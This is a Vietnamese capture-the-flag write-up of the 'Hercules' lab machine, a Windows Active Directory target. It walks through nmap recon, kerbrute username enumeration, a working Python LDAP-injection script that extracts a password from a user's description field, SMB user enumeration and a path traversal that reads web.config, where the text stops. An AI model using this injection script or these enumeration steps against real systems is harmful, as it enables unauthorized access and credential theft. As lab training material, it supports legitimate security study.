---
layout: post
title: "Hercules"
date: 2026-02-02 10:00:00 +0700
tags: redteam Machine-Insane Windows
categories: jekyll update
--- 

## Recon

---

### Nmap

---

```bash
**# Nmap 7.94SVN scan initiated Wed Nov  5 16:36:53 2025 as: nmap -sC -sV -Pn -T4 -stats-every=5s -oN Hercules 10.10.11.91
Nmap scan report for 10.10.11.91
Host is up (0.31s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to <https://10.10.11.91/>
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-05 09:38:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-05T09:39:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Wed Nov  5 16:39:55 2025 -- 1 IP address (1 host up) scanned in 182.53 seconds**

```

Sau khi scan thì thu được:

- **53/TCP - domain - Simple DNS Plus**
- **80/TCP - Web Server - Microsoft IIS httpd 10.0**
- **88/TCP - Kerberos-sec - Microsoft Windows Kerbero**
- **135/TCP - msrpc - Microsoft Windows RPC**
- **139/TCP - netbios-ssn - Microsoft Windows netbios-ssn**
- **389/TCP - LDAP - Microsoft Active Directory LDAP**
- **443/TCP - SSL/HTTP - Microsoft IIS httpd 10.0**
- **445/TCP - microsoft-ds? - ?**
- **464/TCP - kpasswd5? - ?**
- **593/TCP - ncacn_http - Microsoft Windows RPC over HTTP 1.0**
- **636/TCP - ssl/ldap - Microsoft Windows Active Directory LDAP (secure)**
- **3268/TCP - LDAP - Microsoft Windows Active Directory Global Catalog**
- **3269/TCP - ssl/ldap - Microsoft Windows Active Directory Global Catalog (secure)**

Sau khi ghi url **`hercules.htb`** vào trong **`/etc/hosts`**

Đầu tiên mình cần recon về cái web này 

![image](/assets/images/HTB/season9/Hercules/image%201.png)

Như vậy, thấy nó chạy trên **`Microsoft-IIS/10.0`**

Tiếp tục như vậy thì cho chạy **`shortscan`** thử

![image](/assets/images/HTB/season9/Hercules/image%202.png)

Thì sau khi đọc thì thấy có thể bị **`web.config`** và **`precomplied.config`**

Thì mình truy cập qua web thì thấy có hai port là **`80`** và **`443`**

![image](/assets/images/HTB/season9/Hercules/image%203.png)

Sau khi mình tìm ra được phần **`Contact`**

![image](/assets/images/HTB/season9/Hercules/image%204.png)

Nhưng mà nó không có ảnh hưởng gì hay lỗ hổng gì vì nó chỉ là 1 form gửi đến server, ko bị **Stored XSS** hay **SSRF**,...

Và trước đó mình đã recon **`http`** thì ko có gì xảy ra.

Cho nên mình tiếp tục recon qua **`https`**.

![image](/assets/images/HTB/season9/Hercules/image%205.png)

Từ đây mình thấy nó có endpoint **`login`**

![image](/assets/images/HTB/season9/Hercules/image%206.png)

Thấy nó ghi là **SSO - Single Sign-On** nghĩa là login 1 lần là truy cập được nhiều dịch vụ.

Nhưng quan trọng là mình ko có thông tin nào về credentials

Thì mình cũng thử những user mặc định như **`admin/admin`**,...
nhưng cũng không có kết quả.

Cho nên mình thử fuzz username - password xem sao.

![image](/assets/images/HTB/season9/Hercules/image%207.png)

Thì mình thấy thì bị giới hạn login sai. Chỉ còn cách là mình tìm credentials thuiii.

### Enum Users

---

```bash
**└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/

Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 05:34:24 >  Using KDC(s):
2025/10/19 05:34:24 >   10.129.x.x:88

2025/10/19 05:34:25 >  [+] VALID USERNAME:       admin@hercules.htb
2025/10/19 05:35:30 >  [+] VALID USERNAME:       administrator@hercules.htb
2025/10/19 05:35:34 >  [+] VALID USERNAME:       Admin@hercules.htb
2025/10/19 05:44:24 >  [+] VALID USERNAME:       Administrator@hercules.htb
2025/10/19 06:21:49 >  [+] VALID USERNAME:       auditor@hercules.htb
2025/10/19 06:50:19 >  [+] VALID USERNAME:       ADMIN@hercules.htb
2025/10/19 06:50:19 >  [+] VALID USERNAME:       will.s@hercules.htb**

```

Sau đó, là mình đã tìm ra 1 vài user hợp lệ.
Nhìn thấy có user **`will.s@hercules.htb`** thì có thể đây là quy tắc đặt tên cho user là **`[name].[character]@hercules.htb`** thì ở đoạn **`[character]`** được load từ **`a-z`** như vậy có 26 ký tự.

Như vậy thì mình có thể tự tạo ra 1 danh sách kết hợp với **`name.txt`** thì sao để có thể dò tìm ra user khác.

```python
**with open('/home/kali/Desktop/wordlists/SecLists/Usernames/Names/names.txt', 'r') as file:
    for line in file:
        name = line.strip()
        if not name:
            continue
        for c in "abcdefghijklmnopqrstuvwxyz":
            print(f"{name}.{c}@hercules.htb")**

```

Khi chạy thì cần tạo ra 1 danh sách **`python3 generate.py > fuzz_names.txt`**

Sau đó, mình chạy lại tool **`kerbrute`**

```bash
**└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 fuzz_names.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/

Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 11:16:16 >  Using KDC(s):
2025/10/19 11:16:16 >   10.10.11.91:88

2025/10/19 11:18:53 >  [+] VALID USERNAME:       adriana.i@hercules.htb
2025/10/19 11:26:10 >  [+] VALID USERNAME:       angelo.o@hercules.htb
2025/10/19 11:32:35 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 11:44:04 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 11:50:57 >  [+] VALID USERNAME:       camilla.b@hercules.htb
2025/10/19 12:00:16 >  [+] VALID USERNAME:       clarissa.c@hercules.htb
2025/10/19 12:12:30 >  [+] VALID USERNAME:       elijah.m@hercules.htb
2025/10/19 12:18:32 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2025/10/19 12:26:30 >  [+] VALID USERNAME:       harris.d@hercules.htb
2025/10/19 12:26:47 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 12:32:15 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2025/10/19 12:35:16 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 12:35:43 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 12:36:45 >  [+] VALID USERNAME:       joel.c@hercules.htb
2025/10/19 12:36:57 >  [+] VALID USERNAME:       johanna.f@hercules.htb
2025/10/19 12:37:01 >  [+] VALID USERNAME:       johnathan.j@hercules.htb
2025/10/19 12:42:48 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 12:58:00 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 13:02:18 >  [+] VALID USERNAME:       mikayla.a@hercules.htb
2025/10/19 13:07:00 >  [+] VALID USERNAME:       natalie.a@hercules.htb
2025/10/19 13:07:07 >  [+] VALID USERNAME:       nate.h@hercules.htb
2025/10/19 13:12:34 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 13:19:01 >  [+] VALID USERNAME:       ramona.l@hercules.htb
2025/10/19 13:20:27 >  [+] VALID USERNAME:       ray.n@hercules.htb
2025/10/19 13:22:20 >  [+] VALID USERNAME:       rene.s@hercules.htb
2025/10/19 13:28:53 >  [+] VALID USERNAME:       shae.j@hercules.htb
2025/10/19 13:33:28 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 13:33:29 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 13:35:45 >  [+] VALID USERNAME:       tanya.r@hercules.htb
2025/10/19 13:38:20 >  [+] VALID USERNAME:       tish.c@hercules.htb
2025/10/19 13:41:56 >  [+] VALID USERNAME:       vincent.g@hercules.htb
2025/10/19 13:43:45 >  [+] VALID USERNAME:       will.s@hercules.htb
2025/10/19 13:46:54 >  [+] VALID USERNAME:       zeke.s@hercules.htb
2025/10/19 13:47:33 >  Done! Tested 264602 usernames (33 valid) in 9077.013 seconds**

```

Từ đây mình thu được 1 list các danh sách username như sau:

```bash
**└─$ cat hercules_users.txt
auditor
administrator
admin
adriana.i
angelo.o
ashley.b
bob.w
camilla.b
clarissa.c
elijah.m
fiona.c
harris.d
heather.s
jacob.b
jennifer.a
jessica.e
joel.c
johanna.f
johnathan.j
ken.w
mark.s
mikayla.a
natalie.a
nate.h
patrick.s
ramona.l
ray.n
rene.s
shae.j
stephanie.w
stephen.m
tanya.r
tish.c
vincent.g
will.s
winda.s
zeke.s**

```

### LDAP Injection

---

Quay lại trang login thử xem các username này có thể dùng được ko

![image](/assets/images/HTB/season9/Hercules/image%208.png)

Thì khi mà crendentials mình đoán thì nó sẽ in ra **`Invalid login attempt`**

Và nếu mình thử user scan ra trong danh sách.

![image](/assets/images/HTB/season9/Hercules/image%209.png)

Thì nó in ra thông báo là **`Login attempt failed`** -> thì cho thấy username thì hợp lệ.

Như vậy có thể thấy nó kiểm tra dựa vào username. Và có ở đây thì có ý tưởng về **`LDAP Injection`**

- [https://bkhost.vn/blog/ldap-injection/](https://bkhost.vn/blog/ldap-injection/)
- [https://0xdf.gitlab.io/2025/04/05/htb-ghost.html](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html)

Trong machine **ghost**, tác giả đã thực hiện **ldap-injection-password-brute-force**, cho nên mình thử thực hiện cách này xem sao.

![image](/assets/images/HTB/season9/Hercules/image%2010.png)

Phát hiện ra 1 thẻ **input**:

```html
**<input class="form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\\:;&lt;=>?[\\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />**

```

Được kèm theo 1 token là:

```
**__RequestVerificationToken=fZFHRi40bELcGHanbUkeemm--EIOeve6cCFlATOh7CNCY4LnnZZs_B1rrgCy427eL5z88H7i6WH-Igocf9kA8H-gn51DWmR9WY1CwmYeDWM1**

```

Từ đây thì mình đoán được query là **`(&(username=*))`** thì đây nó sẽ trả về kết quả hợp lệ.

Nếu mình thử payload là **`username=a*`**, để xem nó hợp lệ ko nếu hợp lệ thì thử tiếp là **`aa*`** hay **`ab*`**, cho đến khi mình có được username.

Thử encode URL hai lần xem nó có gì khác biệt -> nó in ra **`Login attempt failed`**

![image](/assets/images/HTB/season9/Hercules/image%2011.png)

Như vậy có nghĩa là hợp lệ, như vậy thì có 1 username bắt đầu bằng **`a*`** thử tiếp **`aa*`** hoặc một ký tự nào đó khác **`a`**.

![image](/assets/images/HTB/season9/Hercules/image%2012.png)

Ở đây nó là **`Invalid login attempt`** → thì mình thử ký tự khác.

Tiếp tục mình đoán câu query là **`(&(username=will.s)(description=*))`** với cái payload mình truyền là **`will.s)`** và **`(description=*`** để xác định rằng user đó có description được set.

Mình thử payload **`a*`** trước.

![image](/assets/images/HTB/season9/Hercules/image%2013.png)

Từ đây mình xác định là nó ko bắt đầu từ **`a*`** thì mình viết script tự động làm việc này với 1 danh sách username đã tìm ra.

```python
**import requests
import string
import urllib3
import re
import time
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "<https://hercules.htb>"
LOGIN_PATH = "/Login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False

SUCCESS_INDICATOR = "Login attempt failed"

TOKEN_RE = re.compile(
    r'name="__RequestVerificationToken"\\s+type="hidden"\\s+value="([^"]+)"',
    re.IGNORECASE
)

def get_token(session):
    try:
        response = session.get(BASE + "/Login", verify=VERIFY_TLS, timeout=10)

        token = None
        match = TOKEN_RE.search(response.text)

        if match:
            token = match.group(1)

        return token
    except Exception as e:
        print(f"[!] Error getting token: {e}")
        return None

def test_ldap_injection(username, description_prefix=""):
    session = requests.Session()

    token = get_token(session)
    if not token:
        return False

    if description_prefix:
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\\\29')
        if '\\\\' in escaped_desc and '\\\\2' not in escaped_desc:
            escaped_desc = escaped_desc.replace('\\\\', '\\\\5c')

        payload = f"{username}*)(description={escaped_desc}*"

    else:
        payload = f"{username}*)(description=*"

    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }

    try:
        response = session.post(
            TARGET_URL,
            data=data,
            verify=VERIFY_TLS,
            timeout=10
        )

        # Thành công: LDAP filter matched -> "Login attempt failed"
        # Thất bại: LDAP filter didn't matched -> "Invalid Username"
        return SUCCESS_INDICATOR in response.text
    except Exception as e:
        print(f"[!] Request error: {e}")
        return False

def enumerate_description(username):

    charset = (
        string.ascii_lowercase + # a - z
        string.digits + # 0 - 9
        string.ascii_uppercase + # A - Z
        "!@#$_*-." + # Commmon special chars
        "%^&()=+[]{}|;:',<>?/`~\\" \\\\" # Less common
    )

    print(f"\\n[*] Checking user: {username}")

    if not test_ldap_injection(username):
        print(f"[-] User {username} has not description field")
        return None

    print(f"[*] User {username} has a description field, enumerating...")

    description = ""
    max_length = 50
    no_char_count = 0

    for position in range(max_length):
        found = False

        for char in charset:
            test_desc = description + char

            if test_ldap_injection(username, test_desc):
                description += char
                print(f"    Position {position}: '{char}' -> Current: {description}")
                found = True
                no_char_count = 0
                break

            time.sleep(0.01)

        if not found:
            no_char_count += 1
            if no_char_count >= 2:
                break

    if description:
        print(f"[+] Complete: {username} => {description}")
        return description

    return None

def read_username(file_path):
    try:
        with open(file_path, 'r') as file:
            usernames = [line.strip() for line in file if line.strip() and not line.startswith('#')]
            return usernames
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        return []

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='Hercules LDAP Injection'
    )
    parser.add_argument('-u', '--userfile',
                        help='File containing usernames (one per line)')
    parser.add_argument('--user',
                        help='Single username to test')
    parser.add_argument('-t', '--target',
                        help='Target URL (default: <https://hercules.htb>)')
    parser.add_argument('-o', '--output',
                        default='hercules_passwords.txt',
                        help='Output file (default: hercules_passwords.txt)')

    args = parser.parse_args()

    if args.user:
        usernames = [args.user]
    elif args.userfile:
        usernames = read_username(args.userfile)
        if not usernames:
            print("[!] No usernames to test!")
            return
    else:
        usernames = [
            "auditor",
            "administrator",
            "admin",
        ]
        print("[*] No userfile specified, using default priority users")

    global BASE, TARGET_URL
    BASE = args.target
    TARGET_URL = BASE + LOGIN_PATH

    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Target: {args.target}")
    print(f"Testing {len(usernames)} users")
    print("="*60)

    found_passwords = {}

    for user in usernames:
        password = enumerate_description(user)

        if password:
            found_passwords[user] = password

            with open(args.output, "a") as f:
                f.write(f"{user}:{password}\\n")

            print(f"\\n[+] FOUND: {user}:{password}\\n")

    print("\\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)

    if found_passwords:
        print(f"\\nFound {len(found_password)} passwords:")
        for user, pwd in found_passwords.item():
            print(f"   {user}:{pwd}")
        print(f"\\n[+] Results saved to: {args.output}")
    else:
        print("\\nNo password found")

if __name__ == "__main__":
    main()**

```

Kết quả thu được:

```bash
**┌──(kali㉿kali)-[~/Desktop]
└─$ python3 script.py -u hercules_user.txt -t <https://hercules.htb>
============================================================
Hercules LDAP Description/Password Enumeration
Target: <https://hercules.htb>
Testing 37 users
============================================================

[*] Checking user: auditor
[-] User auditor has not description field

[*] Checking user: administrator
[-] User administrator has not description field

[*] Checking user: admin
[-] User admin has not description field

[*] Checking user: adriana.i
[-] User adriana.i has not description field

[*] Checking user: angelo.o
[-] User angelo.o has not description field

[*] Checking user: ashley.b
[-] User ashley.b has not description field

[*] Checking user: bob.w
[-] User bob.w has not description field

[*] Checking user: camilla.b
[-] User camilla.b has not description field

[*] Checking user: clarissa.c
[-] User clarissa.c has not description field

[*] Checking user: elijah.m
[-] User elijah.m has not description field

[*] Checking user: fiona.c
[-] User fiona.c has not description field

[*] Checking user: harris.d
[-] User harris.d has not description field

[*] Checking user: heather.s
[-] User heather.s has not description field

[*] Checking user: jacob.b
[-] User jacob.b has not description field

[*] Checking user: jennifer.a
[-] User jennifer.a has not description field

[*] Checking user: jessica.e
[-] User jessica.e has not description field

[*] Checking user: joel.c
[-] User joel.c has not description field

[*] Checking user: johanna.f
[-] User johanna.f has not description field

[*] Checking user: johnathan.j
[*] User johnathan.j has a description field, enumerating...
    Position 0: 'c' -> Current: c
    Position 1: 'h' -> Current: ch
    Position 2: 'a' -> Current: cha
    Position 3: 'n' -> Current: chan
    Position 4: 'g' -> Current: chang
    Position 5: 'e' -> Current: change
    Position 6: '*' -> Current: change*
    Position 7: 't' -> Current: change*t
    Position 8: 'h' -> Current: change*th
    Position 9: '1' -> Current: change*th1
    Position 10: 's' -> Current: change*th1s
    Position 11: '_' -> Current: change*th1s_
    Position 12: 'p' -> Current: change*th1s_p
    Position 13: '@' -> Current: change*th1s_p@
    Position 14: 's' -> Current: change*th1s_p@s
    Position 15: 's' -> Current: change*th1s_p@ss
    Position 16: 'w' -> Current: change*th1s_p@ssw
    Position 17: '(' -> Current: change*th1s_p@ssw(
    Position 18: ')' -> Current: change*th1s_p@ssw()
    Position 19: 'r' -> Current: change*th1s_p@ssw()r
    Position 20: 'd' -> Current: change*th1s_p@ssw()rd
    Position 21: '!' -> Current: change*th1s_p@ssw()rd!
    Position 22: '!' -> Current: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!

[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!

[*] Checking user: ken.w
[-] User ken.w has not description field

[*] Checking user: mark.s
[-] User mark.s has not description field

[*] Checking user: mikayla.a
[-] User mikayla.a has not description field

[*] Checking user: natalie.a
[-] User natalie.a has not description field

[*] Checking user: nate.h
[-] User nate.h has not description field

[*] Checking user: patrick.s
[-] User patrick.s has not description field

[*] Checking user: ramona.l
[-] User ramona.l has not description field

[*] Checking user: ray.n
[-] User ray.n has not description field

[*] Checking user: rene.s
[-] User rene.s has not description field

[*] Checking user: shae.j
[-] User shae.j has not description field

[*] Checking user: stephanie.w
[-] User stephanie.w has not description field

[*] Checking user: stephen.m
[-] User stephen.m has not description field

[*] Checking user: tanya.r
[-] User tanya.r has not description field

[*] Checking user: tish.c
[-] User tish.c has not description field

[*] Checking user: vincent.g
[-] User vincent.g has not description field

[*] Checking user: will.s
[-] User will.s has not description field

[*] Checking user: winda.s
[-] User winda.s has not description field

[*] Checking user: zeke.s
[-] User zeke.s has not description field

============================================================
ENUMERATION COMPLETE
============================================================
Traceback (most recent call last):**

```

Mình đã có 1 trường **`description`** của **`johnathan.j`** ⇒ **`change*th1s_p@ssw()rd!!`**

Sau khi có credential này thì mình thử login vào trong smb để double check lại để đảm bảo valid credential.

![image](/assets/images/HTB/season9/Hercules/image%2014.png)

Thì lại hiển thị valid với **`ken.w`**. Cho mình login lại vào bằng **`ken.w`** và enum ra tất cả users.

![image](/assets/images/HTB/season9/Hercules/image%2015.png)

```bash
**SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\\ken.w:change*th1s_p@ssw()rd!!
SMB         dc.hercules.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc.hercules.htb 445    dc               Administrator                 2025-10-17 10:49:44 1       Built-in account for administering the computer/domain
SMB         dc.hercules.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.hercules.htb 445    dc               krbtgt                        2024-12-04 01:39:35 0       Key Distribution Center Service Account
SMB         dc.hercules.htb 445    dc               taylor.m                      2024-12-04 01:44:43 0
SMB         dc.hercules.htb 445    dc               fernando.r                    2024-12-04 01:44:43 0
SMB         dc.hercules.htb 445    dc               james.s                       2024-12-04 01:44:43 0
SMB         dc.hercules.htb 445    dc               anthony.r                     2024-12-04 01:44:43 0
SMB         dc.hercules.htb 445    dc               iis_webserver$                2024-12-04 01:44:43 0
SMB         dc.hercules.htb 445    dc               iis_hadesapppool$             2024-12-04 01:44:44 0
SMB         dc.hercules.htb 445    dc               iis_apppoolidentity$          2024-12-04 01:44:44 0
SMB         dc.hercules.htb 445    dc               iis_defaultapppool$           2024-12-04 01:44:44 0
SMB         dc.hercules.htb 445    dc               auditor                       2024-12-04 01:44:44 1
SMB         dc.hercules.htb 445    dc               vincent.g                     2024-12-04 01:44:45 1
SMB         dc.hercules.htb 445    dc               nate.h                        2024-12-04 01:44:45 1
SMB         dc.hercules.htb 445    dc               stephen.m                     2024-12-04 01:44:45 1
SMB         dc.hercules.htb 445    dc               mark.s                        2024-12-04 01:44:46 1
SMB         dc.hercules.htb 445    dc               elijah.m                      2024-12-04 01:44:46 1
SMB         dc.hercules.htb 445    dc               angelo.o                      2024-12-04 01:44:46 1
SMB         dc.hercules.htb 445    dc               ashley.b                      2024-12-04 01:44:46 1
SMB         dc.hercules.htb 445    dc               clarissa.c                    2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               winda.s                       2024-12-04 01:44:47 0
SMB         dc.hercules.htb 445    dc               rene.s                        2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               will.s                        2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               zeke.s                        2024-12-04 01:44:47 0
SMB         dc.hercules.htb 445    dc               adriana.i                     2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               tish.c                        2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               jennifer.a                    2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               shae.j                        2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               joel.c                        2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               jacob.b                       2024-12-04 01:44:47 1
SMB         dc.hercules.htb 445    dc               web_admin                     2024-12-04 01:44:48 0
SMB         dc.hercules.htb 445    dc               bob.w                         2024-12-04 01:44:48 1
SMB         dc.hercules.htb 445    dc               ken.w                         2024-12-04 01:44:48 0
SMB         dc.hercules.htb 445    dc               johnathan.j                   2024-12-04 01:44:48 1       change*th1s_p@ssw()rd!!
SMB         dc.hercules.htb 445    dc               harris.d                      2024-12-04 01:44:48 1
SMB         dc.hercules.htb 445    dc               ray.n                         2024-12-04 01:44:48 1
SMB         dc.hercules.htb 445    dc               natalie.a                     2025-11-20 09:34:13 0
SMB         dc.hercules.htb 445    dc               ramona.l                      2024-12-04 01:44:49 1
SMB         dc.hercules.htb 445    dc               fiona.c                       2024-12-04 01:44:49 1
SMB         dc.hercules.htb 445    dc               patrick.s                     2024-12-04 01:44:49 1
SMB         dc.hercules.htb 445    dc               tanya.r                       2024-12-04 01:44:49 1
SMB         dc.hercules.htb 445    dc               Admin                         2025-10-17 12:26:46 1
SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES**

```

Từ bảng trên thì để thấy có các tài khoản **`Administrator`**, **`Admin`**, **`web_admin`**.

Giờ mình thử quay lại web để login với user là **`ken.w`** vào xem sao.

![image](/assets/images/HTB/season9/Hercules/image%2016.png)

Mình tiếp tục khám phá trong user này.

Đến với **`Mail`** đầu tiên.

![image](/assets/images/HTB/season9/Hercules/image%2017.png)

- Site Maintenance
    
    ![image](/assets/images/HTB/season9/Hercules/image%2018.png)
    
    Mail đầu tiên này là một thông báo về việc bảo trì trang web, và để đồng bộ với domain thì mình phải login bằng credentials trên cái site này. Nếu mà mình quên password thì liên hệ với **`Natalie`** của **`support team`** để hỗ trợ.
    
- IMPORTANT!!
    
    ![image](/assets/images/HTB/season9/Hercules/image%2019.png)
    
    Mail thứ hai này nó thông báo account mình bị hack, có thể là phishing và có đường link giả mạo là **`http://hadess.htb/ChangePassword`** 
    
- From the Boss
    
    ![image](/assets/images/HTB/season9/Hercules/image%2020.png)
    
    Mail thứ ba này từ **`boss`** nói về việc download phiếu lương tại 1 đường dẫn khác. 
    

Đến mục **`Download`** 

![image](/assets/images/HTB/season9/Hercules/image%2021.png)

Khi mình ấn vào nút download từng phần thi nó thực thi download xuống :0 

![image](/assets/images/HTB/season9/Hercules/image%2022.png)

Nhưng khi quan sát tại proxy thì mình thấy có request như này 

![image](/assets/images/HTB/season9/Hercules/image%2023.png)

Nó truyền tên file cần download qua tham số **`fileName` , như vậy ở đây có thể bị Path Traversal.** Mình sẽ note lại và tiếp tục tìm kiếm. ****

Với mục **`Sercurity`**

![image](/assets/images/HTB/season9/Hercules/image%2024.png)

Lúc mình test thử 2 chức năng này thì nhận được thông báo là **`Contact support to update these details` ,** có thể chưa update.

Đến mục **`Account Details`** 

![image](/assets/images/HTB/season9/Hercules/image%2025.png)

Ở đây có form cho mình thực hiện đổi thông tin tài khoản. Nếu mà lúc này mình đổi thông tin thì hoàn toàn có thể “bứt dây động rừng”, cho nên mình ko nên sẽ quay lại sau. 

Mục cuối cùng là **`Forms`** 

![image](/assets/images/HTB/season9/Hercules/image%2026.png)

Với mục này mình chú ý có chức năng **upload file,** cũng để sau mình sẽ quay lại cái endpoint **`/Downloads`**

### Path Traversal

---

Sau khi hỏi AI về các file nào mình cần đọc thì có kha khá thông tin như sau:

![image](/assets/images/HTB/season9/Hercules/image%2027.png)

Như vậy file đầu tiền mình hướng tới là **`web.config`** . 

![image](/assets/images/HTB/season9/Hercules/image%2028.png)

Mình khi truyền 4 **`..\`** thì ko được nên sẽ bắt đầu rút ngắn lại cho đến khi nào fit. 

![image](/assets/images/HTB/season9/Hercules/image%2029.png)

Như vậy mình hoàn toàn đọc được file **`web.config`** 

```xml
**<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
